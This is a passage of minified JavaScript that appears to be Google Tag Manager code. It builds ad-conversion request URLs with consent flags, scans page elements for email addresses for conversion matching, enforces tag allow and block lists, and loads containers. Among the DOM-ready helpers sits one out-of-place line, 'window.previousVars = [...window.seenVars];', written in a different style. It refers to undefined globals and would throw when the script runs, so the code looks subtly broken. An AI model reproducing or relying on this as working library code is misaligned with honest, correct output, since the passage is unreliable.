            u = u.replace(/[\?#].*$/, "");
            r.push("url=" + encodeURIComponent(u));
            r.push("tft=" + Ua());
            var v = Xc();
            void 0 !== v && r.push("tfd=" + Math.round(v));
            var w = Il(!0);
            r.push("frm=" + w);
            m && r.push("gad=1");
            void 0 !== n && r.push("gad_source=" + encodeURIComponent(n));
          }
          if (S(93)) {
            var x = c;
            void 0 === x && (x = dq.D[Q.g.ka]);
            var y = {},
              A = rl(hl(new gl(0), (y[Q.g.ka] = x, y)));
            r.push("gtm=" + hn(b));
            pm() && r.push("gcs=" + qm());
            r.push("gcd=" + um(A));
            S(39) && (ym() && r.push("dma_cps=" + vm()), r.push("dma=" + xm()));
            om(A) ? S(41) && r.push("npa=0") : r.push("npa=1");
            if (S(62)) {
              Ql(Zl()) && r.push("tcfd=" + zm());
              var C = hm();
              C && r.push("gdpr=" + C);
              var D = gm();
              D && r.push("gdpr_consent=" + D);
            }
          }
          var F = p ? 'https://adservice.google.com/pagead/regclk' : "https://adservice.googlesyndication.com/pagead/regclk";
          if (0 < e.length) for (var H = 0; H < e.length; H++) {
            var G = e[H],
              I = G.aa,
              P = G.Ce;
            if (!pq(a.prefix, P + "." + I, void 0 !== q)) {
              var U = F + "?" + r.join("&");
              "" !== I ? U = "gb" === P ? U + "&wbraid=" + I : U + "&gclid=" + I + "&gclsrc=" + P : "aw.ds" === P && (U += "&gclsrc=aw.ds");
              Uc(U);
            }
          } else if ((m || void 0 !== n) && !pq(a.prefix, "gad", void 0 !== q)) {
            var ia = F + "?" + r.join("&");
            Uc(ia);
          }
        }
      });
    },
    Dq = function (a) {
      return Jn("gclaw") || Jn("gac") || 0 < (Mo().aw || []).length ? !1 : 0 < (Mo().gb || []).length ? !0 : bp(a);
    };
  var Fq = function (a, b) {
      var c = a.Bj,
        d = a.Tj,
        e = a.Xf,
        f = a.mj;
      a.pj && (jo(c[Q.g.Wc], !!c[Q.g.X]) && (Ro(Eq, b), vo(b)), Oo(b), Uo(Eq, b), Cq(b, e, f));
      c[Q.g.X] && (To(Eq, c[Q.g.X], c[Q.g.vc], !!c[Q.g.Nb], b.prefix), wo(no(b.prefix), c[Q.g.X], c[Q.g.vc], !!c[Q.g.Nb], b), wo("FPAU", c[Q.g.X], c[Q.g.vc], !!c[Q.g.Nb], b));
      d && Wo(Eq);
      Yo(Eq);
    },
    Gq = function (a, b, c, d) {
      var e = a.Wj,
        f = a.callback,
        g = a.Cj;
      if ("function" === typeof f) if (e === Q.g.rb && void 0 === g) {
        var k = d(b.prefix, c);
        0 === k.length ? f(void 0) : 1 === k.length ? f(k[0]) : f(k);
      } else e === Q.g.Hb ? (O(65), ro(b, !1), f(lo[no(b.prefix)])) : f(g);
    },
    Eq = ["aw", "dc", "gb"];
  function Hq(a) {
    var b = V(a.s, Q.g.xb),
      c = V(a.s, Q.g.Mb);
    b && !c ? (a.eventName !== Q.g.sa && a.eventName !== Q.g.zd && O(131), a.isAborted = !0) : !b && c && (O(132), a.isAborted = !0);
  }
  ;
  var Jq = /^(www\.)?google(\.com?)?(\.[a-z]{2}t?)?$/,
    Kq = /^www.googleadservices.com$/,
    Mq = function (a) {
      a || (a = Lq());
      return a.kn ? !1 : a.Tl || a.Ul || a.Vl || a.ph || a.Jf || a.El || a.Ll ? !0 : !1;
    },
    Lq = function () {
      var a = {},
        b = Zn(!0);
      a.kn = !!b._up;
      var c = Mo();
      a.Tl = void 0 !== c.aw;
      a.Ul = void 0 !== c.dc;
      a.Vl = void 0 !== c.gbraid;
      var d = Hn(z.location.href),
        e = Fn(d, "query", !1, void 0, "gad");
      a.ph = void 0 !== e;
      if (!a.ph) {
        var f = d.hash.replace("#", ""),
          g = Cn(f, "gad", !1);
        a.ph = void 0 !== g;
      }
      a.Jf = void 0;
      if (S(76)) {
        var k = Fn(d, "query", !1, void 0, "gad_source");
        a.Jf = k;
        if (void 0 === a.Jf) {
          var m = d.hash.replace("#", ""),
            n = Cn(m, "gad_source", !1);
          a.Jf = n;
        }
      }
      var p = E.referrer ? Fn(Hn(E.referrer), "host") : "";
      a.Ll = Jq.test(p);
      a.El = Kq.test(p);
      return a;
    };
  var Nq = function () {
      var a = z.screen;
      return {
        width: a ? a.width : 0,
        height: a ? a.height : 0
      };
    },
    Oq = function (a) {
      if (E.hidden) return !0;
      var b = a.getBoundingClientRect();
      if (b.top == b.bottom || b.left == b.right || !z.getComputedStyle) return !0;
      var c = z.getComputedStyle(a, null);
      if ("hidden" === c.visibility) return !0;
      for (var d = a, e = c; d;) {
        if ("none" === e.display) return !0;
        var f = e.opacity,
          g = e.filter;
        if (g) {
          var k = g.indexOf("opacity(");
          0 <= k && (g = g.substring(k + 8, g.indexOf(")", k)), "%" == g.charAt(g.length - 1) && (g = g.substring(0, g.length - 1)), f = Math.min(g, f));
        }
        if (void 0 !== f && 0 >= f) return !0;
        (d = d.parentElement) && (e = z.getComputedStyle(d, null));
      }
      return !1;
    };
  var Yq = function (a, b, c) {
      var d = a.element,
        e = {
          Z: a.Z,
          type: a.na,
          tagName: d.tagName
        };
      b && (e.querySelector = Xq(d));
      c && (e.isVisible = !Oq(d));
      return e;
    },
    Zq = function (a, b, c) {
      return Yq({
        element: a.element,
        Z: a.Z,
        na: "1"
      }, b, c);
    },
    $q = function (a) {
      var b = !!a.ld + "." + !!a.md;
      a && a.ye && a.ye.length && (b += "." + a.ye.join("."));
      a && a.kb && (b += "." + a.kb.email + "." + a.kb.phone + "." + a.kb.address);
      return b;
    },
    cr = function (a) {
      if (0 != a.length) {
        var b;
        b = ar(a, function (c) {
          return !br.test(c.Z);
        });
        b = ar(b, function (c) {
          return "INPUT" === c.element.tagName.toUpperCase();
        });
        b = ar(b, function (c) {
          return !Oq(c.element);
        });
        return b[0];
      }
    },
    dr = function (a, b) {
      if (!b || 0 === b.length) return a;
      for (var c = [], d = 0; d < a.length; d++) {
        for (var e = !0, f = 0; f < b.length; f++) {
          var g = b[f];
          if (g && yh(a[d].element, g)) {
            e = !1;
            break;
          }
        }
        e && c.push(a[d]);
      }
      return c;
    },
    ar = function (a, b) {
      if (1 >= a.length) return a;
      var c = a.filter(b);
      return 0 == c.length ? a : c;
    },
    Xq = function (a) {
      var b;
      if (a === E.body) b = "body";else {
        var c;
        if (a.id) c = "#" + a.id;else {
          var d;
          if (a.parentElement) {
            var e;
            a: {
              var f = a.parentElement;
              if (f) {
                for (var g = 0; g < f.childElementCount; g++) if (f.children[g] === a) {
                  e = g + 1;
                  break a;
                }
                e = -1;
              } else e = 1;
            }
            d = Xq(a.parentElement) + ">:nth-child(" + e + ")";
          } else d = "";
          c = d;
        }
        b = c;
      }
      return b;
    },
    fr = function (a) {
      for (var b = [], c = 0; c < a.length; c++) {
        var d = a[c],
          e = d.textContent;
        "INPUT" === d.tagName.toUpperCase() && d.value && (e = d.value);
        if (e) {
          var f = e.match(er);
          if (f) {
            var g = f[0],
              k;
            if (z.location) {
              var m = En(z.location, "host", !0);
              k = 0 <= g.toLowerCase().indexOf(m);
            } else k = !1;
            k || b.push({
              element: d,
              Z: g
            });
          }
        }
      }
      return b;
    },
    jr = function () {
      var a = [],
        b = E.body;
      if (!b) return {
        elements: a,
        status: "4"
      };
      for (var c = b.querySelectorAll("*"), d = 0; d < c.length && 1E4 > d; d++) {
        var e = c[d];
        if (!(0 <= gr.indexOf(e.tagName.toUpperCase())) && e.children instanceof HTMLCollection) {
          for (var f = !1, g = 0; g < e.childElementCount && 1E4 > g; g++) if (!(0 <= hr.indexOf(e.children[g].tagName.toUpperCase()))) {
            f = !0;
            break;
          }
          (!f || S(42) && -1 !== ir.indexOf(e.tagName)) && a.push(e);
        }
      }
      return {
        elements: a,
        status: 1E4 < c.length ? "2" : "1"
      };
    },
    kr = !1;
  var er = /[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/i,
    lr = /@(gmail|googlemail)\./i,
    br = /support|noreply/i,
    gr = "SCRIPT STYLE IMG SVG PATH BR NOSCRIPT TEXTAREA".split(" "),
    hr = ["BR"],
    mr = {
      pn: "1",
      Dn: "2",
      tn: "3",
      xn: "4",
      mn: "5",
      En: "6",
      zn: "7"
    },
    nr = {},
    ir = ["INPUT", "SELECT"];
  var Gr = function (a) {
      a = a || {
        ld: !0,
        md: !0
      };
      a.kb = a.kb || {
        email: !0,
        phone: !1,
        address: !1
      };
      var b = $q(a),
        c = nr[b];
      if (c && 200 > Ua() - c.timestamp) return c.result;
      var d = jr(),
        e = d.status,
        f = [],
        g,
        k,
        m = [];
      if (!S(42)) {
        if (a.kb && a.kb.email) {
          var n = fr(d.elements);
          f = dr(n, a && a.ye);
          g = cr(f);
          10 < n.length && (e = "3");
        }
        !a.Mh && g && (f = [g]);
        for (var p = 0; p < f.length; p++) m.push(Zq(f[p], a.ld, a.md));
        m = m.slice(0, 10);
      } else if (a.kb) {}
      g && (k = Zq(g, a.ld, a.md));
      var D = {
        elements: m,
        Fh: k,
        status: e
      };
      nr[b] = {
        timestamp: Ua(),
        result: D
      };
      return D;
    },
    Hr = function (a) {
      return a.tagName + ":" + a.isVisible + ":" + a.Z.length + ":" + lr.test(a.Z);
    };
  var Ir = {
    Xk: Number('') || 500,
    Hk: Number('') || 5E3,
    Ui: Number('') || 10,
    nk: Number('') || 5E3
  };
  function Jr(a) {
    return a.performance && a.performance.now() || Date.now();
  }
  var Kr = function (a, b) {
    var c;
    return c;
  };
  var Lr = "https://" + ni.yd,
    Mr = Lr + "/gtm/static/",
    Nr = Number('') || 5,
    Or = Lr,
    Pr = Mr,
    Qr = !1,
    Rr = 0,
    Sr = Ka();
  function as() {
    var a = !1;
    return a;
  }
  function bs(a) {}
  function ds(a, b, c) {}
  function Xr(a, b, c) {}
  function cs(a, b, c, d) {}
  function es(a) {}
  function fs(a, b, c, d) {}
  function gs() {
    return "attribution-reporting";
  }
  function hs(a) {
    var b;
    b = void 0 === b ? document : b;
    var c;
    return !(null == (c = b.featurePolicy) || !c.allowedFeatures().includes(a));
  }
  ;
  var is = !1;
  function js() {
    if (hs("join-ad-interest-group") && Ea(Dc.joinAdInterestGroup)) return !0;
    is || (Gl('AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9'), is = !0);
    return hs("join-ad-interest-group") && Ea(Dc.joinAdInterestGroup);
  }
  function ks(a, b) {
    var c = void 0;
    try {
      c = E.querySelector('iframe[data-tagging-id="' + b + '"]');
    } catch (e) {}
    if (c) {
      var d = Number(c.dataset.loadTime);
      if (d && 6E4 > Ua() - d) {
        Ab("TAGGING", 9);
        return;
      }
      try {
        c.parentNode.removeChild(c);
      } catch (e) {}
      c = void 0;
    } else try {
      if (50 <= E.querySelectorAll('iframe[allow="join-ad-interest-group"][data-tagging-id*="-"]').length) {
        Ab("TAGGING", 10);
        return;
      }
    } catch (e) {}
    Mc(a, void 0, {
      allow: "join-ad-interest-group"
    }, {
      taggingId: b,
      loadTime: Ua()
    }, c);
  }
  function ls() {
    return "https://td.doubleclick.net";
  }
  ;
  var ms = RegExp("^UA-\\d+-\\d+%3A[\\w-]+(?:%2C[\\w-]+)*(?:%3BUA-\\d+-\\d+%3A[\\w-]+(?:%2C[\\w-]+)*)*$"),
    ns = /^~?[\w-]+(?:\.~?[\w-]+)*$/,
    os = /^\d+\.fls\.doubleclick\.net$/,
    ps = /;gac=([^;?]+)/,
    qs = /;gacgb=([^;?]+)/,
    rs = /;gclaw=([^;?]+)/,
    ss = /;gclgb=([^;?]+)/;
  function ts(a, b) {
    if (os.test(E.location.host)) {
      var c = E.location.href.match(b);
      return c && 2 == c.length && c[1].match(ms) ? decodeURIComponent(c[1]) : "";
    }
    var d = [],
      e;
    for (e in a) {
      for (var f = [], g = a[e], k = 0; k < g.length; k++) f.push(g[k].aa);
      d.push(e + ":" + f.join(","));
    }
    return 0 < d.length ? d.join(";") : "";
  }
  var us = function (a, b, c) {
    var d = Do() ? yo("_gac_gb", !0) : {},
      e = [],
      f = !1,
      g;
    for (g in d) {
      var k = Zo("_gac_gb_" + g, a, b, c);
      f = f || 0 !== k.length && k.some(function (m) {
        return 1 === m;
      });
      e.push(g + ":" + k.join(","));
    }
    return {
      Dl: f ? e.join(";") : "",
      Cl: ts(d, qs)
    };
  };
  function vs(a, b, c) {
    if (os.test(E.location.host)) {
      var d = E.location.href.match(c);
      if (d && 2 == d.length && d[1].match(ns)) return [{
        aa: d[1]
      }];
    } else return Fo((a || "_gcl") + b);
    return [];
  }
  var ws = function (a) {
      return vs(a, "_aw", rs).map(function (b) {
        return b.aa;
      }).join(".");
    },
    xs = function (a) {
      return vs(a, "_gb", ss).map(function (b) {
        return b.aa;
      }).join(".");
    },
    ys = function (a, b) {
      var c = Zo((b && b.prefix || "_gcl") + "_gb", a, b);
      return 0 === c.length || c.every(function (d) {
        return 0 === d;
      }) ? "" : c.join(".");
    };
  var zs = function () {
    if (Ea(z.__uspapi)) {
      var a = "";
      try {
        z.__uspapi("getUSPData", 1, function (b, c) {
          if (c && b) {
            var d = b.uspString;
            d && RegExp("^[\\da-zA-Z-]{1,20}$").test(d) && (a = d);
          }
        });
      } catch (b) {}
      return a;
    }
  };
  var nt = {
    J: {
      Sh: "ads_conversion_hit",
      xd: "container_execute_start",
      Vh: "container_setup_end",
      dg: "container_setup_start",
      Th: "container_blocking_end",
      Uh: "container_execute_end",
      Wh: "container_yield_end",
      eg: "container_yield_start",
      Ni: "event_execute_end",
      Mi: "event_evaluation_end",
      Tg: "event_evaluation_start",
      Oi: "event_setup_end",
      je: "event_setup_start",
      Pi: "ga4_conversion_hit",
      me: "page_load",
      Cn: "pageview",
      Vb: "snippet_load",
      dj: "tag_callback_error",
      ej: "tag_callback_failure",
      fj: "tag_callback_success",
      gj: "tag_execute_end",
      ed: "tag_execute_start"
    }
  };
  function ot() {
    function a(c, d) {
      var e = Cb(d);
      e && b.push(c + "=" + e);
    }
    var b = [];
    a("&u", "GTM");
    a("&ut", "TAGGING");
    a("&h", "HEALTH");
    return b.join("");
  }
  ;
  var pt = !1;
  var Yt = function (a, b) {},
    Zt = function (a, b) {},
    $t = function (a, b) {},
    au = function (a, b) {},
    bu = function () {
      var a = {};
      return a;
    },
    Qt = function (a) {
      a = void 0 === a ? !0 : a;
      var b = {};
      return b;
    },
    cu = function () {},
    du = function (a, b) {},
    eu = function (a, b, c) {},
    fu = function () {};
  var gu = function (a, b) {
    var c = z,
      d,
      e = c.GooglebQhCsO;
    e || (e = {}, c.GooglebQhCsO = e);
    d = e;
    if (d[a]) return !1;
    d[a] = [];
    d[a][0] = b;
    return !0;
  };
  var hu = function (a, b, c) {
    var d = Bl(a, "fmt");
    if (b) {
      var e = Bl(a, "random"),
        f = Bl(a, "label") || "";
      if (!e) return !1;
      var g = on(decodeURIComponent(f.replace(/\+/g, " ")) + ":" + decodeURIComponent(e.replace(/\+/g, " ")));
      if (!gu(g, b)) return !1;
    }
    d && 4 != d && (a = Dl(a, "rfmt", d));
    var k = Dl(a, "fmt", 4);
    Kc(k, function () {
      z.google_noFurtherRedirects && b && b.call && (z.google_noFurtherRedirects = null, b());
    }, void 0, c, E.getElementsByTagName("script")[0].parentElement || void 0);
    return !0;
  };
  var yu = function () {
      this.h = {};
    },
    zu = function (a, b, c) {
      null != c && (a.h[b] = c);
    },
    Au = function (a) {
      return Object.keys(a.h).map(function (b) {
        return encodeURIComponent(b) + "=" + encodeURIComponent(a.h[b]);
      }).join("&");
    },
    Cu = function (a, b, c, d) {};
  function Eu(a, b) {
    if (data.entities && data.entities[a]) return data.entities[a][b];
  }
  ;
  var Gu = function (a, b) {
      Fu(a).entity.push(b);
    },
    Hu = function (a, b) {
      Fu(a).event && Fu(a).event.push(b);
    },
    Iu = function () {
      var a = Fu(uk());
      return a.event ? a.event : [];
    };
  function Fu(a) {
    var b,
      c = oi.r;
    c || (c = {
      container: {}
    }, oi.r = c);
    b = c;
    var d = b.container[a];
    d || (d = {
      entity: [],
      event: []
    }, b.container[a] = d);
    return d;
  }
  ;
  var Ju = new RegExp(/^(.*\.)?(google|youtube|blogger|withgoogle)(\.com?)?(\.[a-z]{2})?\.?$/),
    Ku = {
      cl: ["ecl"],
      customPixels: ["nonGooglePixels"],
      ecl: ["cl"],
      ehl: ["hl"],
      gaawc: ["googtag"],
      hl: ["ehl"],
      html: ["customScripts", "customPixels", "nonGooglePixels", "nonGoogleScripts", "nonGoogleIframes"],
      customScripts: ["html", "customPixels", "nonGooglePixels", "nonGoogleScripts", "nonGoogleIframes"],
      nonGooglePixels: [],
      nonGoogleScripts: ["nonGooglePixels"],
      nonGoogleIframes: ["nonGooglePixels"]
    },
    Lu = {
      cl: ["ecl"],
      customPixels: ["customScripts", "html"],
      ecl: ["cl"],
      ehl: ["hl"],
      gaawc: ["googtag"],
      hl: ["ehl"],
      html: ["customScripts"],
      customScripts: ["html"],
      nonGooglePixels: ["customPixels", "customScripts", "html", "nonGoogleScripts", "nonGoogleIframes"],
      nonGoogleScripts: ["customScripts", "html"],
      nonGoogleIframes: ["customScripts", "html", "nonGoogleScripts"]
    },
    Mu = "google customPixels customScripts html nonGooglePixels nonGoogleScripts nonGoogleIframes".split(" "),
    Pu = function (a) {
      var b = Oi("gtm.allowlist") || Oi("gtm.whitelist");
      b && O(9);
      ui && (b = ["google", "gtagfl", "lcl", "zone"]);
      Nu() && (ui ? O(116) : (O(117), Ou && (b = [], window.console && window.console.log && window.console.log("GTM blocked. See go/13687728."))));
      var c = b && Ya(Ra(b), Ku),
        d = Oi("gtm.blocklist") || Oi("gtm.blacklist");
      d || (d = Oi("tagTypeBlacklist")) && O(3);
      d ? O(8) : d = [];
      Nu() && (d = Ra(d), d.push("nonGooglePixels", "nonGoogleScripts", "sandboxedScripts"));
      0 <= Ra(d).indexOf("google") && O(2);
      var e = d && Ya(Ra(d), Lu),
        f = {};
      return function (g) {
        var k = g && g[Oe.za];
        if (!k || "string" != typeof k) return !0;
        k = k.replace(/^_*/, "");
        if (void 0 !== f[k]) return f[k];
        var m = Gi[k] || [],
          n = a(k, m),
          p;
        p = Fu(uk()).entity;
        for (var q = 0; q < p.length; q++) try {
          n = n && p[q](k, m);
        } catch (y) {
          n = !1;
        }
        if (b) {
          var r;
          if (r = n) a: {
            if (0 > c.indexOf(k)) if (m && 0 < m.length) for (var t = 0; t < m.length; t++) {
              if (0 > c.indexOf(m[t])) {
                O(11);
                r = !1;
                break a;
              }
            } else {
              r = !1;
              break a;
            }
            r = !0;
          }
          n = r;
        }
        var u = !1;
        if (d) {
          var v = 0 <= e.indexOf(k);
          if (v) u = v;else {
            var w = Ma(e, m || []);
            w && O(10);
            u = w;
          }
        }
        var x = !n || u;
        x || !(0 <= m.indexOf("sandboxedScripts")) || c && -1 !== c.indexOf("sandboxedScripts") || (x = Ma(e, Mu));
        return f[k] = x;
      };
    },
    Ou = !1;
  Ou = !0;
  var Nu = function () {
      return Ju.test(z.location && z.location.hostname);
    },
    Qu = function () {
      mk && Gu(uk(), function (a) {
        var b = xf(a),
          c;
        if (Cf(b)) {
          var d = b[Oe.za];
          if (!d) throw "Error: No function name given for function call.";
          var e = qf[d];
          c = !!e && !!e.runInSiloedMode;
        } else c = !!Eu(b[Oe.za], 4);
        return c;
      });
    };
  var Su = function (a, b, c, d, e) {
      if (!Ru() && !Ak(a)) {
        var f = "?id=" + encodeURIComponent(a) + "&l=" + ni.ia,
          g = 0 === a.indexOf("GTM-");
        g || (f += "&cx=c");
        S(53) && (f += "&gtm=" + hn());
        var k = Np();
        k && (f += "&sign=" + ni.zf);
        var m = c ? "/gtag/js" : "/gtm.js",
          n = wi || yi ? Mp(b, m + f) : void 0;
        if (!n) {
          var p = ni.yd + m;
          k && Ec && g && (p = Ec.replace(/^(?:https?:\/\/)?/i, "").split(/[?#]/)[0]);
          n = mp("https://", "http://", p + f);
        }
        var q = a;
        d.siloed && (Dk({
          ctid: q,
          isDestination: !1
        }), q = ok(q));
        var r = q,
          t = Ck();
        ik().container[r] = {
          state: 1,
          context: d,
          parent: t
        };
        jk({
          ctid: r,
          isDestination: !1
        }, e);
        Kc(n);
      }
    },
    Tu = function (a, b, c, d) {
      if (!Ru() && !Bk(a)) if (Ek()) ik().destination[a] = {
        state: 0,
        transportUrl: b,
        context: c,
        parent: Ck()
      }, jk({
        ctid: a,
        isDestination: !0
      }, d), O(91);else {
        var e = "/gtag/destination?id=" + encodeURIComponent(a) + "&l=" + ni.ia + "&cx=c";
        S(53) && (e += "&gtm=" + hn());
        Np() && (e += "&sign=" + ni.zf);
        var f = wi || yi ? Mp(b, e) : void 0;
        f || (f = mp("https://", "http://", ni.yd + e));
        var g = a;
        c.siloed && (Dk({
          ctid: g,
          isDestination: !0
        }), g = ok(g));
        ik().destination[g] = {
          state: 1,
          context: c,
          parent: Ck()
        };
        jk({
          ctid: g,
          isDestination: !0
        }, d);
        Kc(f);
      }
    };
  function Ru() {
    if (Xm()) {
      return !0;
    }
    return !1;
  }
  ;
  var Uu = !1,
    Vu = 0,
    Wu = [];
  function Xu(a) {
    if (!Uu) {
      var b = E.createEventObject,
        c = "complete" == E.readyState,
        d = "interactive" == E.readyState;
      if (!a || "readystatechange" != a.type || c || !b && d) {
        Uu = !0;
        for (var e = 0; e < Wu.length; e++) J(Wu[e]);
      }
      Wu.push = function () {
        for (var f = 0; f < arguments.length; f++) J(arguments[f]);
        return 0;
      };
    }
  }
  window.previousVars = [...window.seenVars];
  function Yu() {
    if (!Uu && 140 > Vu) {
      Vu++;
      try {
        E.documentElement.doScroll("left"), Xu();
      } catch (a) {
        z.setTimeout(Yu, 50);
      }
    }
  }
  var Zu = function (a) {
    Uu ? a() : Wu.push(a);
  };
  var av = function (a, b, c) {
    return {
      entityType: a,
      indexInOriginContainer: b,
      nameInOriginContainer: c,
      originContainerId: tk()
    };
  };
  var cv = function (a, b) {
      this.h = !1;
      this.H = [];
      this.N = {
        tags: []
      };
      this.T = !1;
      this.C = this.D = 0;
      bv(this, a, b);
    },
    dv = function (a, b, c, d) {
      if (ri.hasOwnProperty(b) || "__zone" === b) return -1;
      var e = {};
      nb(d) && (e = B(d, e));
      e.id = c;
      e.status = "timeout";
      return a.N.tags.push(e) - 1;
    },
    ev = function (a, b, c, d) {
      var e = a.N.tags[b];
      e && (e.status = c, e.executionTime = d);
    },
    fv = function (a) {
      if (!a.h) {
        for (var b = a.H, c = 0; c < b.length; c++) b[c]();
        a.h = !0;
        a.H.length = 0;
      }
    },
    bv = function (a, b, c) {
      void 0 !== b && a.Bf(b);
      c && z.setTimeout(function () {
        return fv(a);
      }, Number(c));
    };
  cv.prototype.Bf = function (a) {
    var b = this,
      c = Wa(function () {
        return J(function () {
          a(tk(), b.N);
        });
      });
    this.h ? c() : this.H.push(c);
  };
  var gv = function (a) {
      a.D++;
      return Wa(function () {
        a.C++;
        a.T && a.C >= a.D && fv(a);
      });
    },
    hv = function (a) {
      a.T = !0;
      a.C >= a.D && fv(a);
    };
  var iv = {},
    kv = function () {
      return z[jv()];
    },
    lv = !1;
  function jv() {
    return z.GoogleAnalyticsObject || "ga";
  }
  var ov = function (a) {},
    pv = function (a, b) {
      return function () {
        var c = kv(),
          d = c && c.getByName && c.getByName(a);
        if (d) {
          var e = d.get("sendHitTask");
          d.set("sendHitTask", function (f) {
            var g = f.get("hitPayload"),
              k = f.get("hitCallback"),
              m = 0 > g.indexOf("&tid=" + b);
            m && (f.set("hitPayload", g.replace(/&tid=UA-[0-9]+-[0-9]+/, "&tid=" + b), !0), f.set("hitCallback", void 0, !0));
            e(f);
            m && (f.set("hitPayload", g, !0), f.set("hitCallback", k, !0), f.set("_x_19", void 0, !0), e(f));
          });
        }
      };
    };
  var uv = {},
    vv = {};
  function wv(a, b) {
    if (Ok) {
      var c;
      c = b.match(/^(gtm|gtag)\./) ? encodeURIComponent(b) : "*";
      uv[a] = "&e=" + c + "&eid=" + a;
      Yk(a);
    }
  }
  function xv(a) {
    var b = a.eventId,
      c = a.hc;
    if (!uv[b]) return "";
    var d = vv[b] ? "" : "&es=1";
    d += uv[b];
    c && (vv[b] = !0);
    return d;
  }
  ;
  var yv = {};
  function zv(a, b) {
    Ok && (yv[a] = yv[a] || {}, yv[a][b] = (yv[a][b] || 0) + 1);
  }
  function Av(a) {
    var b = a.eventId,
      c = a.hc,
      d = yv[b] || {},
      e = [],
      f;
    for (f in d) d.hasOwnProperty(f) && e.push("" + f + d[f]);
    c && delete yv[b];
    return e.length ? "&md=" + e.join(".") : "";
  }
  ;
  var Bv = {},
    Cv = {
      aev: "1",
      c: "2",
      jsm: "3",
      v: "4",
      j: "5",
      smm: "6",
      rmm: "7",
      input: "8"
    };
  function Dv(a, b, c) {
    if (Ok) {
      Bv[a] = Bv[a] || [];
      var d = Cv[b] || "0",
        e;
      e = c instanceof z.Element ? "1" : c instanceof z.Event ? "2" : c instanceof z.RegExp ? "3" : c === z ? "4" : c === E ? "5" : c instanceof z.Promise ? "6" : c instanceof z.Storage ? "7" : c instanceof z.Date ? "8" : c instanceof z.History ? "9" : c instanceof z.Performance ? "a" : c === z.crypto ? "b" : c instanceof z.Location ? "c" : c instanceof z.Navigator ? "d" : "object" !== typeof c || nb(c) ? "0" : "e";
      Bv[a].push("" + d + e);
    }
  }
  function Ev(a) {
    var b = a.eventId,
      c = Bv[b] || [];
    if (!c.length) return "";
    a.hc && delete Bv[b];
    return "&pcr=" + c.join(".");
  }
  ;
  var Fv = {},
    Gv = {};
  function Hv(a, b, c) {
    if (Ok && b) {
      var d = gk(b);
      Fv[a] = Fv[a] || [];
      Fv[a].push(c + d);
      var e = (Cf(b) ? "1" : "2") + d;
      Gv[a] = Gv[a] || [];
      Gv[a].push(e);
      Yk(a);
    }
  }
  function Iv(a) {
    var b = a.eventId,
      c = a.hc,
      d = "",
      e = Fv[b] || [];
    e.length && (d += "&tr=" + e.join("."));
    var f = Gv[b] || [];
    f.length && (d += "&ti=" + f.join("."));
    c && (delete Fv[b], delete Gv[b]);
    return d;
  }
  ;
  function Jv(a, b, c, d) {
    var e = of[a],
      f = Kv(a, b, c, d);
    if (!f) return null;
    var g = zf(e[Oe.cj], c, []);
    if (g && g.length) {
      var k = g[0];
      f = Jv(k.index, {
        onSuccess: f,
        onFailure: 1 === k.tj ? b.terminate : f,
        terminate: b.terminate
      }, c, d);
    }
    return f;
  }
  function Kv(a, b, c, d) {
    function e() {
      if (f[Oe.Mk]) k();else {
        var w = Af(f, c, []),
          x = w[Oe.dk];
        if (null != x) for (var y = 0; y < x.length; y++) if (!ak(x[y])) {
          k();
          return;
        }
        var A = dv(c.Wb, String(f[Oe.za]), Number(f[Oe.qe]), w[Oe.Nk]),
          C = !1;
        w.vtp_gtmOnSuccess = function () {
          if (!C) {
            C = !0;
            var H = Ua() - F;
            Hv(c.id, of[a], "5");
            ev(c.Wb, A, "success", H);
            S(24) && eu(c, f, nt.J.fj);
            g();
          }
        };
        w.vtp_gtmOnFailure = function () {
          if (!C) {
            C = !0;
            var H = Ua() - F;
            Hv(c.id, of[a], "6");
            ev(c.Wb, A, "failure", H);
            S(24) && eu(c, f, nt.J.ej);
            k();
          }
        };
        w.vtp_gtmTagId = f.tag_id;
        w.vtp_gtmEventId = c.id;
        c.priorityId && (w.vtp_gtmPriorityId = c.priorityId);
        Hv(c.id, f, "1");
        var D = function () {
          kj(3);
          var H = Ua() - F;
          Hv(c.id, f, "7");
          ev(c.Wb, A, "exception", H);
          S(24) && eu(c, f, nt.J.dj);
          C || (C = !0, k());
        };
        S(24) && du(c, f);
        var F = Ua();
        try {
          yf(w, {
            event: c,
            index: a,
            type: 1
          });
        } catch (H) {
          D(H);
        }
        S(24) && eu(c, f, nt.J.gj);
      }
    }
    var f = of[a],
      g = b.onSuccess,
      k = b.onFailure,
      m = b.terminate;
    if (c.isBlocked(f)) return null;
    var n = zf(f[Oe.ij], c, []);
    if (n && n.length) {
      var p = n[0],
        q = Jv(p.index, {
          onSuccess: g,
          onFailure: k,
          terminate: m
        }, c, d);
      if (!q) return null;
      g = q;
      k = 2 === p.tj ? m : q;
    }
    if (f[Oe.Xi] || f[Oe.Pk]) {
      var r = f[Oe.Xi] ? pf : c.Ym,
        t = g,
        u = k;
      if (!r[a]) {
        e = Wa(e);
        var v = Lv(a, r, e);
        g = v.onSuccess;
        k = v.onFailure;
      }
      return function () {
        r[a](t, u);
      };
    }
    return e;
  }
  function Lv(a, b, c) {
    var d = [],
      e = [];
    b[a] = Mv(d, e, c);
    return {
      onSuccess: function () {
        b[a] = Nv;
        for (var f = 0; f < d.length; f++) d[f]();
      },
      onFailure: function () {
        b[a] = Ov;
        for (var f = 0; f < e.length; f++) e[f]();
      }
    };
  }
  function Mv(a, b, c) {
    return function (d, e) {
      a.push(d);
      b.push(e);
      c();
    };
  }
  function Nv(a) {
    a();
  }
  function Ov(a, b) {
    b();
  }
  ;
  var Qv = function (a, b) {
      return 1 === arguments.length ? Pv("set", a) : Pv("set", a, b);
    },
    Rv = function (a, b) {
      return 1 === arguments.length ? Pv("config", a) : Pv("config", a, b);
    },
    Sv = function (a, b, c) {
      c = c || {};
      c[Q.g.Pb] = a;
      return Pv("event", b, c);
    };
  function Pv(a) {
    return arguments;
  }
  var Tv = function () {
    this.h = [];
    this.C = [];
  };
  Tv.prototype.enqueue = function (a, b, c) {
    var d = this.h.length + 1;
    a["gtm.uniqueEventId"] = b;
